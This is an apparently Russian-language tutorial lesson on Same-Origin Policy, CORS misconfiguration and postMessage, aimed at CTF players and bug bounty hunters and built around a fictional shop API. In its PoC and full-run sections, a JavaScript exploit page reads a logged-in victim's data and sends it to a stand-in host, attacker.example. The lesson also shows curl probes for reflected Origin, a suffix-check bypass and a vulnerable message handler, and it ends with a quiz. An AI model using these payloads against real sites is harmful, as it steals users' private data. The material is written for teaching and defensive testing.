---
id: web-same-origin-cors
title: "Same-Origin Policy, CORS и postMessage"
category: web
parent: web-http-basics
difficulty: easy
order: 4
tags: [cors, same-origin, sop, postmessage, acao, misconfig]
prerequisites: [web-http-basics]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Почему браузер не даёт читать чужой домен, как CORS это разрешает и какие конфигурации открывают доступ злоумышленнику."
---

Представь: пользователь залогинен в `shop.local`, а в соседней вкладке он открыл твой сайт `evil.local`. Если бы скрипт с `evil.local` мог свободно читать ответы `shop.local`, он бы утащил чужие заказы и данные. Именно поэтому в браузере есть **Same-Origin Policy (SOP)** — правило «читай только свой домен». А чтобы сайтам можно было легально общаться, придумали **CORS**. Ошибки в CORS — один из самых частых багов в API.

В этом уроке мы возьмём API магазина `api.shop.local` и проверим **одну** его конфигурацию: можно ли с чужого сайта прочитать данные пользователя.

## Наш пример: API магазина

У `shop.local` есть отдельный API-домен `api.shop.local`, который отдаёт данные пользователя:

```bash
$ curl -s 'https://api.shop.local/api/me' -b 'session=...'
{"user":"admin","email":"admin@shop.local","role":"admin"}
```

Ответ содержит приватные данные. Вопрос: а может ли их прочитать скрипт, запущенный на `evil.local`, если жертва залогинена? Именно это решает SOP и CORS.

## Шаг 1: что такое Origin

**Origin (источник)** — это схема + хост + порт, все три вместе. Смена любого компонента делает origin другим:

| URL | Origin |
|-----|--------|
| `https://shop.local/x` | `https://shop.local` |
| `http://shop.local` | `http://shop.local` (другая схема!) |
| `https://api.shop.local` | `https://api.shop.local` (другой хост!) |
| `https://shop.local:8443` | `https://shop.local:8443` (другой порт!) |

`https://shop.local` и `https://api.shop.local` — **разные** origin. `https://shop.local` и `http://shop.local` — тоже разные.

SOP означает: JS со страницы `https://evil.local` не может **прочитать ответ** `fetch('https://api.shop.local/api/me')`. Важно: SOP не запрещает *отправить* запрос — он запрещает **прочитать результат**. (Запрет на действие — это уже CSRF, отдельный класс.)

## Шаг 2: пробуем в лоб — браузер блокирует

На странице `https://evil.local` напишем:

```html
<script>
  fetch('https://api.shop.local/api/me', {credentials:'include'})
    .then(r => r.text())
    .then(d => console.log(d));
</script>
```

Браузер отправит запрос (cookie жертвы уйдут, потому что `credentials:'include'`), но в консоли появится ошибка:

```
Access to fetch at 'https://api.shop.local/api/me' from origin 'https://evil.local'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
```

Это SOP в действии: без явного разрешения ответ не отдаётся скрипту.

## Шаг 3: CORS — как сервер разрешает

Когда JS делает кросс-доменный запрос, браузер сам добавляет заголовок `Origin: https://evil.local`. Сервер может ответить:

```
Access-Control-Allow-Origin: https://evil.local
Access-Control-Allow-Credentials: true
```

`Access-Control-Allow-Origin` (ACAO) говорит браузеру: «ответ этому origin читать можно». Если значение не совпадает с `Origin` или заголовка нет — браузер отдаёт ошибку и «прячет» тело.

Проверим конфигурацию `api.shop.local` руками, подставив `Origin: https://evil.local`:

```bash
$ curl -s -i 'https://api.shop.local/api/me' \
    -H 'Origin: https://evil.local' -b 'session=...' | grep -i access-control
Access-Control-Allow-Origin: https://evil.local
Access-Control-Allow-Credentials: true
```

Сервер вернул **наш** origin обратно. Проверим ещё раз с другим доменом — если он тоже отражается, значит валидации нет:

```bash
$ curl -s -i 'https://api.shop.local/api/me' \
    -H 'Origin: https://evil2.local' -b 'session=...' | grep -i 'access-control-allow-origin'
Access-Control-Allow-Origin: https://evil2.local
```

Отражается любой origin вместе с `Allow-Credentials: true` — это **критичный** CORS-баг: любой сайт может прочитать данные залогиненного пользователя.

## Шаг 4: собираем PoC

Теперь докажем, что данные реально утекают. На странице `https://evil.local`:

```html
<script>
  fetch('https://api.shop.local/api/me', {credentials:'include'})
    .then(r => r.text())
    .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
</script>
```

Жертва открывает `evil.local`, будучи залогинена в магазине, — и её данные уходят на сервер атакующего:

```
GET /log?d=%7B%22user%22%3A%22admin%22%2C%22email%22%3A%22admin%40shop.local%22%7D
```

Вот это и есть артефакт находки: приватные данные в логе атакующего.

## Шаг 5: обходы проверки и postMessage

Часто разработчики «проверяют» домен нестрого. Классическая ошибка — проверка по суффиксу:

```js
if (origin.endsWith('shop.local')) { /* разрешить */ }
```

Её обходит домен, который ты можешь зарегистрировать сам:

```bash
$ curl -s -i 'https://api.shop.local/api/me' \
    -H 'Origin: https://attacker-shop.local' -b 'session=...' | grep -i access-control-allow-origin
Access-Control-Allow-Origin: https://attacker-shop.local
```

Строка `attacker-shop.local` заканчивается на `shop.local`, поэтому проверка `endsWith` её пропускает. Правильно — сравнивать по границе домена (`endsWith('.shop.local')`) или точно.

Ещё два вектора:

- **`Origin: null`** — так выглядит origin из sandbox-iframe и `data:`-страниц. Если сервер отражает `null`, ты можешь читать данные из своего sandbox.
- **`postMessage` без проверки origin.** Межоконное общение:

```js
// УЯЗВИМО: принимает сообщение из любого окна
window.addEventListener('message', (e) => {
  document.getElementById('token').innerHTML = e.data;
});
```

Атакующий открывает сайт в iframe и шлёт произвольные данные → DOM-XSS или утечка. Защита — проверять `e.origin` по белому списку.

## Шаг 6: preflight — предварительный запрос

Если запрос «сложный» (метод `PUT`/`DELETE`, заголовок `Content-Type: application/json` или кастомный заголовок), браузер сначала шлёт **preflight** — запрос методом `OPTIONS`, спрашивая разрешение:

```bash
$ curl -s -i -X OPTIONS 'https://api.shop.local/api/me' \
    -H 'Origin: https://evil.local' \
    -H 'Access-Control-Request-Method: GET' | grep -i access-control
Access-Control-Allow-Origin: https://evil.local
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Credentials: true
```

Список `PUT, DELETE` — расширенная поверхность: с чужого origin разрешены и изменяющие методы. Проверяй preflight и сам запрос **отдельно**: иногда их правила различаются.

## Полный прогон: от проверки до утечки

1. Находим API, который отдаёт данные пользователя с credentials.
2. Подставляем `Origin: https://evil.local` — сервер отражает его и ставит `Allow-Credentials: true`.
3. Строим страницу-эксплойт на своём домене:

```html
<script>
  fetch('https://api.shop.local/api/me', {credentials:'include'})
    .then(r => r.text())
    .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
</script>
```

4. Жертва открывает страницу → её данные уходят к нам.

Артефакт — приватные данные в логе атакующего. Если `Allow-Credentials` не выставлен, а данные отдаются по ключу в URL, кража тоже возможна, но нужен утекший или предсказуемый ключ.

## Справочная таблица заголовков CORS

| Заголовок | Значение | Риск |
|-----------|----------|------|
| `Access-Control-Allow-Origin` | какой origin читает ответ | отражение = критично |
| `Access-Control-Allow-Credentials` | разрешены cookie | усиливает любой ACAO |
| `Access-Control-Allow-Methods` | методы | `PUT`/`DELETE` расширяют поверхность |
| `Access-Control-Expose-Headers` | видимые заголовки | утечка токенов |
| `Vary: Origin` | корректный кэш | без него — отравление кэша |

## Что мы теперь знаем

- Origin = схема + хост + порт; любое изменение делает origin другим.
- SOP не даёт читать ответ чужого origin, но не мешает отправить запрос.
- CORS разрешает чтение через `Access-Control-Allow-Origin`; с credentials нужен точный origin.
- Отражение произвольного `Origin` + `Allow-Credentials: true` — критичный баг (кража данных).
- `postMessage` без проверки `event.origin` — отдельная утечка/DOM-XSS.

## На что смотреть дальше

- **`Vary: Origin`.** Без него кэш может отдать одному клиенту `ACAO`, предназначенный другому.
- **`Access-Control-Expose-Headers`.** Может раскрыть чувствительные заголовки (например, токены).
- **`document.domain`.** Если сайт его выставляет, изоляция между поддоменами ослабляется.

## Квиз

Выбери один вариант в каждом вопросе.

```quiz
- question: "Что такое Origin?"
  options:
    - "Схема + хост + порт"
    - "Только хост"
    - "IP-адрес сервера"
    - "Значение заголовка `Host`"
  answer: 0
  explanation: "Origin включает схему, хост и порт; `https://a.com` и `http://a.com` — разные."
- question: "Какую комбинацию CORS-заголовков браузер отклонит как невалидную?"
  options:
    - "`ACAO: https://a.com` + `ACAC: true`"
    - "`ACAO: *` + `ACAC: true`"
    - "`ACAO: *` без `ACAC`"
    - "`ACAO: null`"
  answer: 1
  explanation: "Спека запрещает `*` вместе с `Access-Control-Allow-Credentials: true`."
- question: "Чем опасен ответ `Access-Control-Allow-Origin: null`?"
  options:
    - "Он ничего не значит"
    - "Позволяет читать данные из sandbox-iframe и `data:`-страниц"
    - "Отключает HTTPS"
    - "Включает preflight"
  answer: 1
  explanation: "Origin `null` можно получить из sandbox/data-контекстов, которыми управляет атакующий."
- question: "Проверку `origin.endsWith('shop.local')` обходит домен, который атакующий может зарегистрировать сам:"
  options:
    - "`shop.local.attacker.net`"
    - "`attackershop.local`"
    - "`attacker.net`"
    - "`sub.attacker.net`"
  answer: 1
  explanation: "Строка `attackershop.local` заканчивается на `shop.local`, поэтому `endsWith` её пропускает."
- question: "Какую проверку обязательно должен делать обработчик `message`?"
  options:
    - "Проверять `event.data` на длину"
    - "Проверять `event.origin` по белому списку"
    - "Проверять `document.domain`"
    - "Проверять `Referer` в JS"
  answer: 1
  explanation: "Без проверки `event.origin` любой сайт может слать сообщения в твой обработчик."
```

## Куда дальше

Мы разобрались, почему браузер изолирует домены. Теперь посмотрим, **где** приложение хранит токены и данные на клиенте — и почему это опасно при XSS. Об этом в следующем уроке про Web Storage. А пока запомни: **SOP запрещает читать чужой ответ; CORS это разрешает — и ошибка в разрешении отдаёт данные атакующему.**

## Где пригодится

- **CTF (Web):** CORS-мисконфиг и postMessage-XSS — популярные задания, где флаг отдаётся только «правильному» origin.
- **Bug bounty:** отражение Origin с credentials — высокооплачиваемый баг; проверяется за минуты через curl.
- **Пентест:** анализ CORS входит в проверку API и одностраничных приложений (SPA).
- **Работа (AppSec/Dev):** настройка CORS и обработчиков `message` — базовая гигиена клиентской безопасности.
